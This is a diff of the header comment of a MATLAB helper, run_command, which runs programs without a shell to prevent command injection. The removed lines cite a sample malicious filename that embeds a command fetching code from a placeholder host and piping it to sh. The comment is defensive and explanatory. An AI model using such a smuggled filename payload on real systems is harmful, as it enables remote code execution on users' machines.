@@ -6,20 +6,9 @@ function [status, cmdout] = run_command(argv, options)
 % instead of a single command string, and NEVER hands that string to a
 % shell for parsing.
 %
-% Background: system() always routes its command string through a shell
-% (/bin/sh on macOS/Linux, cmd.exe on Windows). Building that string with
-% sprintf and a path that can originate from a shared/scanned folder (a
-% SimNIBS m2m/ folder, a raw NIfTI filename, ...) is the command-injection
-% pattern reported against BabelBrain (PRs #137/#139): a filename like
-% ernie.msh.$(curl -s <ip>:1337 | sh).msh gets its embedded command
-% executed as soon as the string reaches the shell. shell_quote_arg.m
-% mitigates this by single-quote-escaping each value, but that is still a
-% defense *within* a shell invocation. run_command removes the shell
-% entirely: java.lang.ProcessBuilder(argv) passes each cell array element
-% to the OS as one literal argument (via execve()/CreateProcess()), with
-% no tokenizing, globbing, or expansion of $(...) / `...` / $VAR / ; / | /
-% && ever applied — so there is nothing for a malicious value to inject
-% into, regardless of its contents.
+% Each argv element reaches the program as one literal argument
+% (execve/CreateProcess, no shell), so no value, e.g. a file name with
+% $(...) in it, can inject shell syntax.
 %
 % Use run_command for any call that is really just "run this program with
 % these arguments". For the rarer case that genuinely needs shell
